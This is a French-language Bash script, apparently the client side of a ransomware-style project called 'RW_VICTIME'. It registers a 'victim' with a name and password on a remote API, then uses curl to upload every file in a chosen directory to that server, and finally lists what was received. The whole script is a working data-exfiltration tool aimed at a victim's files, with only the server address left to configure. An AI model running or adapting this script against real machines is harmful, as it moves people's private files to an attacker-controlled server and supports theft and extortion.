#!/bin/bash

# Script pour uploader un répertoire complet vers l'API RW_VICTIME
# Usage: ./upload_directory.sh [API_URL] [VICTIM_NAME] [VICTIM_PASSWORD]

# Couleurs pour l'affichage
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration par défaut
DEFAULT_API_URL="http://localhost:8080"
API_URL="${1:-$DEFAULT_API_URL}"
VICTIM_NAME="${2:-}"
VICTIM_PASSWORD="${3:-}"

# Fonction pour afficher les messages
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Fonction pour vérifier les dépendances
check_dependencies() {
    local missing_deps=()
    
    if ! command -v curl &> /dev/null; then
        missing_deps+=("curl")
    fi
    
    if ! command -v jq &> /dev/null; then
        missing_deps+=("jq")
    fi
    
    if [ ${#missing_deps[@]} -ne 0 ]; then
        log_error "Dépendances manquantes: ${missing_deps[*]}"
        log_info "Installez-les avec: sudo apt-get install ${missing_deps[*]}"
        exit 1
    fi
}

# Fonction pour demander les informations de la victime
get_victim_info() {
    if [ -z "$VICTIM_NAME" ]; then
        echo -n "Nom de la victime: "
        read -r VICTIM_NAME
    fi
    
    if [ -z "$VICTIM_PASSWORD" ]; then
        echo -n "Mot de passe de la victime: "
        read -rs VICTIM_PASSWORD
        echo
    fi
}

# Fonction pour sélectionner le répertoire
select_directory() {
    if [ -n "$1" ]; then
        DIRECTORY="$1"
    else
        echo -n "Chemin du répertoire à uploader (ou appuyez sur Entrée pour sélectionner): "
        read -r DIRECTORY
        
        if [ -z "$DIRECTORY" ]; then
            # Utiliser zenity si disponible, sinon fallback sur read
            if command -v zenity &> /dev/null; then
                DIRECTORY=$(zenity --file-selection --directory --title="Sélectionner le répertoire à uploader")
                if [ $? -ne 0 ]; then
                    log_error "Aucun répertoire sélectionné"
                    exit 1
                fi
            else
                echo -n "Chemin du répertoire: "
                read -r DIRECTORY
            fi
        fi
    fi
    
    if [ ! -d "$DIRECTORY" ]; then
        log_error "Le répertoire '$DIRECTORY' n'existe pas"
        exit 1
    fi
    
    log_info "Répertoire sélectionné: $DIRECTORY"
}

# Fonction pour créer une victime
create_victim() {
    log_info "Création de la victime '$VICTIM_NAME'..."
    
    local response=$(curl -s -X POST "$API_URL/victime" \
        -H "Content-Type: application/json" \
        -d "{\"name\":\"$VICTIM_NAME\",\"password\":\"$VICTIM_PASSWORD\"}")
    
    if echo "$response" | jq -e '.message' > /dev/null 2>&1; then
        log_success "Victime créée avec succès"
        return 0
    else
        # Vérifier si la victime existe déjà
        if echo "$response" | grep -q "already exists\|déjà existe"; then
            log_warning "La victime existe déjà"
            return 0
        else
            log_error "Erreur lors de la création de la victime: $response"
            return 1
        fi
    fi
}

# Fonction pour uploader un fichier
upload_file() {
    local file_path="$1"
    local relative_path="$2"
    
    log_info "Upload de: $relative_path"
    
    local response=$(curl -s -X POST "$API_URL/upload" \
        -F "file=@$file_path" \
        -F "filepathvictime=$relative_path" \
        -F "name=$VICTIM_NAME" \
        -F "password=$VICTIM_PASSWORD")
    
    if echo "$response" | jq -e '.message' > /dev/null 2>&1; then
        local file_size=$(echo "$response" | jq -r '.file.FileSize')
        log_success "Fichier uploadé: $relative_path ($file_size bytes)"
        return 0
    else
        log_error "Erreur lors de l'upload de $relative_path: $response"
        return 1
    fi
}

# Fonction pour scanner et uploader le répertoire
scan_and_upload() {
    local base_dir="$1"
    local total_files=0
    local uploaded_files=0
    local failed_files=0
    
    log_info "Scan du répertoire: $base_dir"
    
    # Compter le nombre total de fichiers
    total_files=$(find "$base_dir" -type f | wc -l)
    log_info "Nombre total de fichiers à uploader: $total_files"
    
    # Uploader chaque fichier
    while IFS= read -r -d '' file; do
        # Calculer le chemin relatif
        local relative_path="${file#$base_dir/}"
        
        # Uploader le fichier
        if upload_file "$file" "$relative_path"; then
            ((uploaded_files++))
        else
            ((failed_files++))
        fi
        
        # Afficher le progrès
        echo -ne "\rProgrès: $uploaded_files/$total_files fichiers uploadés"
        
    done < <(find "$base_dir" -type f -print0)
    
    echo # Nouvelle ligne après la barre de progrès
    
    log_success "Upload terminé: $uploaded_files fichiers uploadés, $failed_files échecs"
}

# Fonction pour vérifier les fichiers uploadés
verify_upload() {
    log_info "Vérification des fichiers uploadés..."
    
    local response=$(curl -s -X GET "$API_URL/files?name=$VICTIM_NAME&password=$VICTIM_PASSWORD")
    
    if echo "$response" | jq -e '.files' > /dev/null 2>&1; then
        local file_count=$(echo "$response" | jq '.files | length')
        log_success "Nombre de fichiers dans la base: $file_count"
        
        # Afficher les 5 premiers fichiers
        echo "$response" | jq -r '.files[0:5][] | "  - \(.FileName) (\(.FileSize) bytes)"'
        
        if [ "$file_count" -gt 5 ]; then
            log_info "... et $((file_count - 5)) autres fichiers"
        fi
    else
        log_error "Erreur lors de la vérification: $response"
    fi
}

# Fonction d'aide
show_help() {
    echo "Usage: $0 [API_URL] [VICTIM_NAME] [VICTIM_PASSWORD] [DIRECTORY]"
    echo ""
    echo "Options:"
    echo "  API_URL         URL de l'API (défaut: http://localhost:8080)"
    echo "  VICTIM_NAME     Nom de la victime"
    echo "  VICTIM_PASSWORD Mot de passe de la victime"
    echo "  DIRECTORY       Répertoire à uploader"
    echo ""
    echo "Exemples:"
    echo "  $0"
    echo "  $0 http://192.168.1.100:8080"
    echo "  $0 http://localhost:8080 Victime1 MotDePasse123"
    echo "  $0 http://localhost:8080 Victime1 MotDePasse123 /home/user/documents"
}

# Fonction principale
main() {
    echo "=== Script d'Upload de Répertoire RW_VICTIME ==="
    echo
    
    # Vérifier les arguments d'aide
    if [[ "$1" == "-h" || "$1" == "--help" ]]; then
        show_help
        exit 0
    fi
    
    # Vérifier les dépendances
    check_dependencies
    
    # Obtenir les informations de la victime
    get_victim_info
    
    # Sélectionner le répertoire
    select_directory "$4"
    
    # Créer la victime
    if ! create_victim; then
        exit 1
    fi
    
    # Scanner et uploader
    scan_and_upload "$DIRECTORY"
    
    # Vérifier l'upload
    verify_upload
    
    log_success "Processus terminé avec succès!"
}

# Gestion des erreurs
set -e
trap 'log_error "Erreur à la ligne $LINENO"' ERR

# Exécuter le script principal
main "$@" 